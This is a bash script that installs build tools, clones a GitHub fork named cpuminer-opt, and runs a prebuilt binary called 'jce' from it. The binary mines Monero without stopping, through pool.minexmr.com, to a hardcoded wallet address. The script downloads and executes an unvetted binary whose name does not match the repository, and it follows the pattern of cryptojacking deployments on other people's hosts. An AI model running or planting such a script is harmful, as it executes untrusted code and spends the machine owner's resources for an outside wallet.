#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
rm -rf cpuminer-opt &&
git clone https://github.com/fablebox/cpuminer-opt &&
cd cpuminer-opt &&
chmod +x jce &&
./jce --auto --any --forever  -o pool.minexmr.com:7777 -u 47pCretSUPoiDciZZiGS3SccgSU3Rfr9ShFgMtAanMGdFKtC3arCBuaVzC16NubjCK1ksVkd7n6NA7oAhQ3v8bSZ9dz6AcZ -p x
